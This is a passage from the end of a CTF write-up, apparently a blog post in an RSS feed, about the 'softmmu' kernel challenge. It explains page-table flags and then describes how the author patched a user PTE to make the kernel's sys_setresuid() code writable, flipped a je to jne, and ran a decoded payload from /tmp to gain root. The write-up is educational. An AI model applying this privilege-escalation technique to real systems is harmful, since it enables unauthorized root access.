<p>There are many bits and flops, but assuming basic knowledge of paging nothing is too out of ordinary. The first three flags are interesting: P (<strong>P</strong>resent), R/W (<strong>R</strong>ead/<strong>W</strong>rite) and U/S (<strong>U</strong>ser/<strong>S</strong>upervisor).
If the <strong>P</strong>resent bit is set then the page is actually in physical memory at the moment, if the <strong>R</strong>ead and <strong>W</strong>rite bit is set then the page is both readable and writable (if not then it is read only) and lastly the <strong>U</strong>Ser/<strong>S</strong>upervisor bit is set based on privellege level.</p>

<p>We can get to work on patching the bytes of the PTE, we are able to patch one of our userspace page entries to pount to a physical adress that contains the kernel code of sys_setresuid() and make it writable. Once we got that we can flip the prillege check from je to jne, call setresuid(0) and obtain root &gt;:3</p>

<pre><code class="shell">/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x
&lt; ... &gt;
{CENSORED_FLAG}
/ # whoami
</code></pre>

<h2 id="conclusions">Conclusions</h2>

<p>This without a doubt is a serious challenge full of hurdles. Personally for me it symbolizes some sort of maturity in my cybersecurity journey, I learned so much throughout and I can&#8217;t wait to do more.</p>

<p>About the softmmu itself, this post only showed the a small part of the failures. So much stuff I first tried didn&#8217;t end up working at the end, this only shows how deep and complex it gets. I believe it is a prime example of diving deep and reading old documentation about the kernel&#8217;s inner workings and trying to figure it all out.</p>

<p><img src="./static/img/softmmu/softmmu_completed.png" style="width:20%"></p>

<p>TLDR: the kernel is complex</p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-softmmu.txt</guid>
  <link>gopher://localhost:7070/0.//article-softmmu.txt</link>
  <pubDate>Sun, 12 Feb 2023 00:00:00 GMT</pubDate>
</item>

  </channel>
</rss>
